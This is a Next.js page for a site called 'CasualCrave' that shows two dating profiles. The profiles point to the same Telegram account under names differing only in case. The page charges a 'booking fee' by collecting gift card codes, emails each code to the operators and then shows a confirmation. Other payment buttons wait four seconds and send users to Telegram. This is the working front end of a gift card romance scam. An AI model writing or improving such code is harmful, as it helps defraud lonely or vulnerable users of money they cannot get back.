/* eslint-disable react/no-unescaped-entities */
/* eslint-disable @next/next/no-img-element */
'use client';

import { sendGiftCardEmail } from "@/lib/sendGiftCardEmail";
import { useUser } from "@clerk/nextjs";
import Head from "next/head";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import { FaCheckCircle } from "react-icons/fa";

export default function Explore() {
  const [giftCardID, setGiftCardID] = useState("");
  const { isSignedIn, isLoaded, user } = useUser();
  const router = useRouter();
  const [selectedPlan, setSelectedPlan] = useState<string>("");
  const [isLoading, setIsLoading] = useState(false);
  const [bookingConfirmed, setBookingConfirmed] = useState(false);
  const [selectedProfile, setSelectedProfile] = useState<string>("");

  const handleSelectProfile = (profile: {
    name: string;
    age: number;
    desc: string;
    image: string;
    telegram: string;
  }) => {
    setSelectedProfile(profile.telegram);
  };

  const handleSubmitGiftCard = async () => {
    if (giftCardID.trim() !== "" && selectedProfile !== "") {
      try {
        await sendGiftCardEmail({
          userName: user?.fullName || "Anonymous",
          telegramUsername: selectedProfile,
          giftCardID,
        });

        setGiftCardID("");
        setBookingConfirmed(true);

        setTimeout(() => {
          router.push("/nextlevel");
        }, 2000);
      } catch (error) {
        console.error("Email send failed:", error);
        alert("There was an issue sending your confirmation email. Please try again.");
      }
    } else {
      alert("Please select a profile and enter a valid Gift Card ID before submitting.");
    }
  };

  useEffect(() => {
    if (isLoaded && !isSignedIn) {
      router.push("/login");
    }
  }, [isLoaded, isSignedIn, router]);

  if (!isSignedIn) {
    return null;
  }

  const profiles = [
    {
      name: "Kiara",
      age: 23,
      desc: "Adventurous and open-minded. Let’s vibe 🌙",
      image: "/images/profile1.jpg",
      telegram: "Kiara77990",
    },
    {
      name: "Lexxie",
      age: 24,
      desc: "Let’s skip the small talk 😘",
      image: "/images/profile2.jpg",
      telegram: "kiara77990",
    },
  ];

  return (
    <>
      <Head>
        <title>Explore | CasualCrave</title>
      </Head>

      <nav className="bg-gray-900 text-white px-6 py-4 shadow-md flex justify-between items-center w-full">
        <div className="flex space-x-8">
          <Link href="/" className="hover:text-pink-400 transition">
            Home
          </Link>
          <Link href="/mng" className="hover:text-pink-400 transition">
            Mng
          </Link>
        </div>
        {user?.imageUrl && (
          <img
            src={user.imageUrl}
            alt="User Profile"
            className="w-10 h-10 rounded-full border-2 border-pink-500"
          />
        )}
      </nav>

      <main className="min-h-screen bg-gray-900 text-white py-28 px-6">
        <h2 className="text-4xl font-bold text-center text-pink-500 mb-12">
          Available Profiles
        </h2>
        <p className="font-serif text-center text-gray-500 mb-5">
          <span>🔊</span> Due to high demand, you get access to 2 new profiles every week — time to make your vibe count!
        </p>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-6 justify-center max-w-xl mx-auto mb-10">
          {profiles.map((profile) => (
            <div
              key={profile.telegram}
              onClick={() => handleSelectProfile(profile)}
              className={`bg-gray-800 rounded-2xl shadow-lg overflow-hidden text-center p-4 sm:p-6 cursor-pointer transition border-4 w-full max-w-xs mx-auto ${
                selectedProfile === profile.telegram
                  ? "border-pink-500 ring-2 ring-pink-400"
                  : "border-gray-700 hover:border-pink-500"
              }`}
            >
              <img
                src={profile.image}
                alt={`Profile ${profile.name}`}
                className="w-16 h-16 sm:w-20 sm:h-20 mx-auto rounded-full object-cover border-4 border-pink-500 mb-3"
              />
              <h2 className="text-lg sm:text-2xl font-semibold mb-1">
                {profile.name}, {profile.age}
              </h2>
              <p className="text-gray-300 text-sm sm:text-base mb-3">{profile.desc}</p>
              <Link
                href={`https://t.me/${profile.telegram}`}
                target="_blank"
                className="inline-block bg-pink-500 hover:bg-pink-600 text-white px-3 py-1.5 sm:px-4 sm:py-2 rounded-full transition text-sm sm:text-base"
                onClick={(e) => e.stopPropagation()}
              >
                Message on Telegram
              </Link>
            </div>
          ))}
        </div>

        <section className="mt-10 max-w-4xl mx-auto bg-gray-800 p-8 rounded-2xl shadow-2xl text-left">
          <h3 className="text-3xl font-bold text-pink-500 mb-4">Why We Charge a Booking Fee</h3>
          <p className="text-gray-300 mb-4 leading-relaxed">
            CasualCrave is designed to protect your time and ensure premium experiences. Every booking request requires a small reservation fee to confirm interest and filter out unserious inquiries. This lets our talent focus on real vibes and ensures high-quality connections.
          </p>
          <ul className="text-gray-400 list-disc pl-5 mb-6 space-y-2">
            <li>🔒 Your fee secures a real-time response within minutes</li>
            <li>🎯 100% goes toward matching & scheduling effort</li>
            <li>⚡ Avoids spam, fakes, or last-minute cancels</li>
            <li>💌 Fee gets applied to your full experience if you proceed</li>
          </ul>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-6 justify-center mt-8">
            {[
              {
                id: "giftcard",
                title: "Gift Cards",
                desc: "Confirm availability, get Telegram access, and enjoy a discreet 1:1 vibe.",
                price: "€50",
              },
              {
                id: "priority",
                title: "Priority Booking",
                desc: "Get priority access + a bonus surprise 😘",
                price: "€125",
              },
            ].map((plan) => (
              <div
                key={plan.id}
                onClick={() => setSelectedPlan(plan.id)}
                className={`cursor-pointer bg-gray-700 p-6 rounded-xl shadow-lg border transition duration-300 relative ${
                  selectedPlan === plan.id
                    ? "border-4 border-pink-500 ring-2 ring-pink-400"
                    : "border-gray-600 hover:border-pink-500"
                }`}
              >
                {selectedPlan === plan.id && (
                  <FaCheckCircle className="absolute top-4 right-4 text-green-400 text-xl" />
                )}
                <h4 className="text-xl font-semibold mb-2 text-white">{plan.title}</h4>
                <p className="text-gray-400 mb-4">{plan.desc}</p>
                <div className="text-3xl font-bold text-pink-500 mb-2">{plan.price}</div>
              </div>
            ))}
          </div>

          <div id="payment" className="flex flex-wrap justify-center gap-4 my-6">
            {["giftcard", "payId", "paypal", "wallet"].map((method) => (
              <button
                key={method}
                onClick={() => {
                  setIsLoading(true);
                  setTimeout(() => {
                    setSelectedPlan(method);
                    setIsLoading(false);
                  }, 4000);
                }}
                className={`px-4 py-2 rounded-full transition ${
                  selectedPlan === method
                    ? "bg-pink-500 text-white"
                    : "bg-gray-700 text-gray-300 hover:bg-gray-600"
                }`}
              >
                {method.charAt(0).toUpperCase() + method.slice(1)}
              </button>
            ))}
          </div>

          {["giftcard", "priority"].includes(selectedPlan) && (
            <div className="space-y-4 text-left">
              <label className="block text-sm text-gray-300 mb-3">
                Your Name (for booking)
                <input
                  type="text"
                  value={user?.fullName || ""}
                  readOnly
                  className="mt-1 w-full px-4 py-2 rounded-lg bg-gray-700 text-white border border-pink-500"
                />
              </label>

              <label className="block text-sm text-gray-300">
                Enter Gift Card ID
                <input
                  type="text"
                  value={giftCardID}
                  onChange={(e) => setGiftCardID(e.target.value)}
                  className="mt-1 w-full px-4 py-2 rounded-lg bg-gray-700 text-white border border-pink-500"
                  placeholder="XXXX-XXXX-XXXX"
                />
              </label>

              <button
                onClick={handleSubmitGiftCard}
                className="mt-2 bg-pink-600 hover:bg-pink-700 text-white font-semibold px-6 py-2 rounded-full transition"
              >
                Submit Gift Card
              </button>

              {bookingConfirmed && selectedProfile && (
                <div className="mt-4 p-4 bg-green-600 text-white rounded-lg shadow-lg animate-pulse">
                  ✅ Booking confirmed! Message{" "}
                  <span className="font-bold">@{selectedProfile}</span> on Telegram to start your experience.
                </div>
              )}
            </div>
          )}

          {["paypal", "payId", "wallet"].includes(selectedPlan) &&
            isLoading &&
            selectedProfile && (
              <div className="mt-6 p-4 bg-gray-700 text-white rounded-lg shadow-lg text-center animate-pulse">
                Request payment info from{" "}
                <span className="font-bold">@{selectedProfile}</span> on Telegram...
              </div>
            )}

          <p className="mt-8 text-gray-500 text-sm text-center italic">
            Still unsure? DM us on <a href="">CasualCrave@gmail.com</a>. We're always down for clarity before connection 💬
          </p>
        </section>
      </main>
    </>
  );
}
